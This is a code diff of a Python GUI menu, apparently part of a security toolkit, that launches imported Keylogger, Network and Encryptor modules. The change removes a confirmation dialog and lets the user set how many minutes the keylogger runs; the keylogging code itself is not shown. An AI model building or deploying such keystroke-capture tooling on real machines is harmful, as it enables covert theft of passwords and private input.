@@ -3,7 +3,7 @@
 
 from customtkinter import *
 from PIL import Image
-from Keylogger import start_keylogger
+import Keylogger
 import Network
 from Encryptor import encryptor
 import multiprocessing
@@ -37,31 +37,67 @@ def place():
 
 
 def keylogging():
-    response = msg.askyesnocancel("Confirm Keylogger", "Are you sure you want to begin keylogger?")
-    if response is None:
-        # User clicked "Cancel"
-        return
-    elif response:
-        global keyLogLabel
-        keyLogLabel = CTkLabel(master=menu, text="Keylogger is running", font=("Calibri", 20))
-        keyLogLabel.place(relx=0.5, rely=0.5, anchor="center")
-        keyLogBtn.place_forget()
-        networkBtn.place_forget()
-        encryptBtn.place_forget()
-        instructionLabel.place_forget()
-        quitBtn.place_forget()
-        menu.update()
+        
+    keyLogBtn.place_forget()
+    networkBtn.place_forget()
+    encryptBtn.place_forget()
+    instructionLabel.place_forget()
+    quitBtn.place_forget()
+    menu.update()
+
+    keyLogLengthErrorLabel = CTkLabel(master=menu, text="", text_color="#EE4B2B", 
+                                anchor="center", font=("ArialBold", 12))
+    keyLogLengthErrorLabel.place(relx=0.5, rely=0.8, anchor="center")
+
+    def runKeylog():
+        keyLogLength = keyLogLengthEntry.get()
+        try: 
+            keyLogLengthS = int(round(float(keyLogLength)*60))
+            if keyLogLengthS <=0:
+                raise Exception
+            keyLogLengthBtn.place_forget()
+            keyLogLengthEntry.place_forget()
+            keyLogLengthLabel.place_forget()
+            keyLogLengthErrorLabel.place_forget()
+            global keyLogLabel
+            keyLogLabel = CTkLabel(master=menu, text="Keylogger is running", font=("Calibri", 20))
+            keyLogLabel.place(relx=0.5, rely=0.5, anchor="center")
+            menu.update()
+    
+            Keylogger.start_keylogger(keyLogLengthS)
+            time.sleep(keyLogLengthS)
+
+            menu.deiconify()
+            quitBtn.place(relx=0.5, rely=0.85, anchor="center")
+            keyLogBtn.place(relx=0.5, rely=0.3, anchor="center")
+            encryptBtn.place(relx=0.5, rely=0.45, anchor="center")
+            networkBtn.place(relx=0.5, rely=0.6, anchor="center")
+            instructionLabel.place(relx=0.5, rely=0.15, anchor="center")
+            keyLogLabel.place_forget()
+            
+
+            menu.update()
+            return
+        except:
+            keyLogLengthErrorLabel.configure(text="Error: Length Provided was not a valid input (Must be a whole number)")
+            keyLogLengthEntry.delete("0", "end")
+            menu.update()
+            return
+
         
         
-        start_keylogger()
-        time.sleep(10)
-        quitBtn.place(relx=0.5, rely=0.85, anchor="center")
-        keyLogBtn.place(relx=0.5, rely=0.3, anchor="center")
-        encryptBtn.place(relx=0.5, rely=0.45, anchor="center")
-        networkBtn.place(relx=0.5, rely=0.6, anchor="center")
-        instructionLabel.place(relx=0.5, rely=0.15, anchor="center")
-        keyLogLabel.place_forget()
-        menu.update()
+        
+
+
+    keyLogLengthLabel = CTkLabel(master=menu, text="How long in minutes should the keylogger run for?", font=("Calibri", 20))
+    keyLogLengthLabel.place(relx=0.5, rely=0.2, anchor="center")
+    keyLogLengthEntry = CTkEntry(master=menu, width=50, fg_color="#EEEEEE", border_color="#598eb2", 
+                        border_width=1, text_color="#000000")
+    keyLogLengthEntry.place(relx=0.5, rely=0.4, anchor="center")
+    keyLogLengthBtn = CTkButton(master=menu, text="Submit", corner_radius=10, fg_color="transparent", 
+                    hover_color="#598eb2", border_color="#FFFFFF", border_width=2, command=runKeylog)
+    keyLogLengthBtn.place(relx=0.5, rely=0.6, anchor="center")
+
 
 def encrypt():
     currentWindow.withdraw()
